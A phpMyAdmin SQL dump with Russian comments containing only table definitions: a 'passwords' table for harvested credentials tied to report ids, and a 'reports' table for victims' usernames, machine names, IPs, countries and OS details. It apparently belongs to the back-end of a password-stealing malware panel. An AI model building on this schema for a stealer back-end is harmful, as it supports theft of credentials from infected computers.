-- phpMyAdmin SQL Dump
-- version 4.0.10.14
-- http://www.phpmyadmin.net
--
-- Хост: localhost:3306
-- Время создания: Май 10 2016 г., 11:28
-- Версия сервера: 5.5.45-cll-lve
-- Версия PHP: 5.4.31

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данных: `zorgazor_1`
--

-- --------------------------------------------------------

--
-- Структура таблицы `passwords`
--

CREATE TABLE IF NOT EXISTS `passwords` (
  `soft_type` varchar(300) NOT NULL,
  `soft_name` varchar(300) NOT NULL,
  `report_id` varchar(300) NOT NULL,
  `p1` varchar(300) NOT NULL,
  `p2` varchar(300) NOT NULL,
  `p3` varchar(300) NOT NULL,
  `p4` varchar(300) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `reports`
--

CREATE TABLE IF NOT EXISTS `reports` (
  `id` int(11) NOT NULL,
  `date` datetime NOT NULL,
  `username` varchar(300) NOT NULL,
  `compname` varchar(300) NOT NULL,
  `ip` varchar(300) NOT NULL,
  `country` varchar(300) NOT NULL,
  `os` varchar(300) NOT NULL,
  `machine_id` varchar(300) NOT NULL,
  `file` varchar(300) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
